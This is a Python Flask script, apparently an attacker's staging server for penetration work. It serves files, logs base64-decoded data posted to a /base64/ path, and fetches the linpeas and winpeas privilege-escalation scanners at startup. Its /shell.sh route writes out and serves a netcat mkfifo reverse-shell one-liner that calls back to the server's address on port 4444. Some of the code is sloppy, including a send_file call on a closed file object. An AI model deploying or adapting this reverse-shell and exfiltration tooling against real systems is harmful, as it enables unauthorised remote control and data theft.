import os, argparse, base64, logging
from flask import Flask, abort, json, send_file, request
import requests
from formater import Formatter

logger = logging.getLogger()
logger.setLevel(logging.DEBUG)

consoleHandler = logging.StreamHandler()
consoleHandler.setLevel(logging.DEBUG)
consoleHandler.setFormatter(Formatter())

logger.addHandler(consoleHandler)

parser = argparse.ArgumentParser()
parser.add_argument('-i', '--address', type=str, help='IP to listen on')
parser.add_argument('-p', '--port', type=int, help='Port to listen on')
parser.add_argument('-d', '--dir', type=str, help='Directory to host on root path')
parser.add_argument('-v', '--verbose', action='store_true', help='Enable verbose logging')

args = parser.parse_args()

if args.address == None:
    args.address = '0.0.0.0'

if args.port == None:
    args.port = 80

if args.dir == None:
    args.dir = os.getcwd()

if args.verbose == None:
    args.verbose = False

api = Flask(__name__)

# Accepts a file path
# If requested file exists in the directory specified by the args.dir argument, the file is returned.
# If file is specified a JSON response is sent to indicate the service is up
@api.route('/', defaults={'req_path': ''})
@api.route('/<path:req_path>')
def dir_listing(req_path):
    # Joining the base and the requested path
    abs_path = os.path.join(args.dir, req_path)

    logHeaders(args.verbose, request)

    if os.path.exists(req_path):
        logger.debug("{0} {1} - /{2} {3}".format(request.remote_addr, str(request.method), req_path, "200 OK"))
        return send_file(req_path)
    elif os.path.isfile(abs_path):
        logger.debug("{0} {1} - /{2} {3}".format(request.remote_addr, str(request.method), req_path, "200 OK"))
        return send_file(abs_path)
    else:
        logger.error("{0} {1} - /{2} {3}".format(request.remote_addr, str(request.method), req_path, "404 Not Found"))
        return abort(404)

# Accepts a string to decode
# Attempts to decode prvided strings and logs the decoded data
@api.route('/base64/<encoded>')
def decode_base64(encoded):
    logHeaders(args.verbose, request)
    logger.info("{0} {1} - /base64/{2} ".format(request.remote_addr, str(request.method), encoded))
    try:
        logger.debug("Decoded data: {0}".format(base64.b64decode(encoded).decode('utf-8')))
    except Exception:
        logger.error('Failed to parse Base64')

    return json.dumps({}), 200, {}

# Creats a reverse shell script and sends it back
@api.route('/shell.sh')
def shell():
    shellFile = 'shell.sh'
    logHeaders(args.verbose, request)
    shellFile = open(shellFile, "w")
    shellFile.writelines("rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {0} 4444 >/tmp/f".format(args.address))
    shellFile.close()
    return send_file(shellFile)

# Logs each header in the request if enabled
def logHeaders(verbose, request):
    if verbose:
        for h in request.headers:
            logger.debug("{0}: {1}".format(h[0], h[1]))

def setup():
    linpeasFile = 'linpeas.sh'
    if not os.path.exists(linpeasFile):
        response = requests.get('https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh')
        with open(linpeasFile, mode='wb') as file:
            file.write(response.content)
    
    winpeasFile = 'winpeas.exe'
    if not os.path.exists(winpeasFile):
        response = requests.get('https://github.com/peass-ng/PEASS-ng/releases/latest/download/winpeasany.exe')
        with open(winpeasFile, mode='wb') as file:
            file.write(response.content)

if __name__ == '__main__':
    from waitress import serve
    setup()
    serve(api, host=args.address, port=str(args.port))